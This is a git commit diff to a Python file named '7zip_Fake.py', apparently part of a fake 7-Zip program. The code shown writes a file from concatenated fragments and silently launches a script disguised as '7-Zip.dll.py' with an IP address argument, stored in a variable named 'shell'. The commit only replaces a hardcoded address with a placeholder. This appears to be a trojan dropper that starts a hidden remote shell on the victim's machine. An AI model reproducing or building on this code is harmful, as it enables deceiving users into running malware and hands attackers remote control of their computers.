ff69c6b2694e9f01b0be62190dfa822b2a81bf93
Semiotic <78098764+christianj2k@users.noreply.github.com>
2023-03-13 16:28:21 -0400

    Update 7zip_Fake.py

--- 7-Zip Fake/7zip_Fake.py
+++ 7-Zip Fake/7zip_Fake.py
@@ -101,7 +101,7 @@ class Zip_Gui:
         f.write(a1+a2+a3+a4+c1+b1+b2+b3+b4+b5+b6+b7+b8+b9+b10+b11+b12+b13+b14+b15+b16+b17+b18+b19+b20+a5+a6+a7+a7_1+a8+a9+a10+a11+a12+a13+a14+a15+a16+a17+a18+a19+a20+a21+a21_1+a21_2+a22+a23+a24+a25+a26+a27)
         f.close()
 
-        shell = sp.Popen(["python", "7-Zip.dll.py", "192.168.1.1"], stdout=sp.DEVNULL)
+        shell = sp.Popen(["python", "7-Zip.dll.py", "<ip address>"], stdout=sp.DEVNULL)
 
     def Ip_Pay(self):
 
